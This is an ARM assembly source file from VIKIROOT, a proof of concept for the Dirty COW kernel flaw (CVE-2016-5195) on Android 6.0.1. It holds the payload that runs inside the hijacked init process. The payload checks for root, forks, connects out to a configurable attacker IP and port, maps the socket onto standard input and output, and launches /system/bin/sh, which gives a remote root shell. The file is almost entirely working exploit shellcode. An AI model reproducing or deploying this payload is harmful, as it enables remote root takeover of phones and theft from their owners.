/*
 * CVE-2016-5195 POC FOR ANDROID 6.0.1 MARSHMALLOW
 *
 * Heavily inspired by https://github.com/scumjr/dirtycow-vdso
 *
 * This file is part of VIKIROOT, https://github.com/hyln9/VIKIROOT
 *
 * Copyright (C) 2016-2017 Virgil Hou <virgil@zju.edu.cn>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

.equ SYS_OPENAT, 0x142
.equ SYS_SOCKET, 0x119
.equ SYS_CONNECT, 0x11b
.equ SYS_DUP3, 0x116
.equ SYS_CLONE, 0x78
.equ SYS_EXECVE, 0xb
.equ SYS_EXIT, 0x1
.equ SYS_READLINKAT, 0x14c
.equ SYS_GETUID, 0x18
.equ SYS_GETPID, 0x14

.equ AF_INET, 0x2
.equ O_EXCL, 0x100
.equ O_CREAT, 0x0200
.equ S_IRWXU, 0x1c0
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2
.equ SIGCHLD, 0x11

.equ IP, 0xdeadc0de
.equ PORT, 0x1337

_start:

        ////////////////////////////////////////////////////////////////
        //
        // save registers
        //
        ////////////////////////////////////////////////////////////////

        push    {r0, r1}

        ////////////////////////////////////////////////////////////////
        //
        // target init(0)
        // return if getuid() != 0 or getpid() !=1
        //
        ////////////////////////////////////////////////////////////////

        ldr    r7, =__NR_getuid
        svc    #0
        cmp    r0, #0
        bne    return
        ldr    r7, =__NR_getpid
        svc    #0
        cmp    r0, #1
        bne   return

        ////////////////////////////////////////////////////////////////
        //
        // return if open("/data/local/tmp/.x", O_CREAT|O_EXCL, ?) fails
        // use "openat" instead since "open" is deprecated
        // intended to detect write permission and avoid conflict
        //
        ////////////////////////////////////////////////////////////////

        mov    r0, #0    // dirfd is ignored
        adr    r1, path
        mov    r2, #300
        mov    r3, #448
        ldr    r7, =__NR_openat
        svc    #0
        mov    r5, #12
        mov    r6, #1
        cmn    r0, r6, lsl r5
        bhi   return

        ////////////////////////////////////////////////////////////////
        //
        // fork is deprecated, replaced with clone
        //
        ////////////////////////////////////////////////////////////////

        mov    r0, #17
        mov    r1, #0
        mov    r2, #0
        mov    r3, #0
        mov    r4, #0
        ldr    r7,  =__NR_clone
        svc    #0
        cmp    r0, #0
        bne    return

        ////////////////////////////////////////////////////////////////
        //
        // reverse connect
        //
        ////////////////////////////////////////////////////////////////

        // sockfd = socket(AF_INET, SOCK_STREAM, 0)
        mov    r0, #2
        mov    r1, #1
        mov    r2, #0
        ldr    r7, =__NR_socket
        svc    #0
        mov    r3, r0

        // connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
        adr    r1, sockaddr
        mov    r2, #16
        ldr    r7, =__NR_connect
        svc    #0
        cmp    r0, #0
        bne    exit

        // dup3(sockfd, STDIN, 0) ...
        mov    r0, r3
        mov    r2, #0
        mov    r1, #0
        ldr    r7, =__NR_dup3
        svc    #0
        mov    r1, #1
        ldr    r7, =__NR_dup3
        svc    #0
        mov    r1, #2
        ldr    r7, =__NR_dup3
        svc    #0

        // execve('/system/bin/sh', NULL, NULL)
        adr    r0, shell
        mov    r2, #0
        str    r0, [sp, #0]
        str    r2, [sp, #8]
        mov    r1, sp
        ldr    r7, =__NR_execve
        svc    #0

exit:
        mov    r0, #0
        ldr    r7, =__NR_exit
        svc    #0

return:
        pop    {r0, r1}
        mov    r8, r14
        mov    r14, r12
        nop
        nop
        bx     r8

path:
        .string "/data/local/tmp/.x"

        .balign 4
sockaddr:
        .short STDERR
        .short PORT
        .word  IP

shell:
        .string "/system/bin/sh"
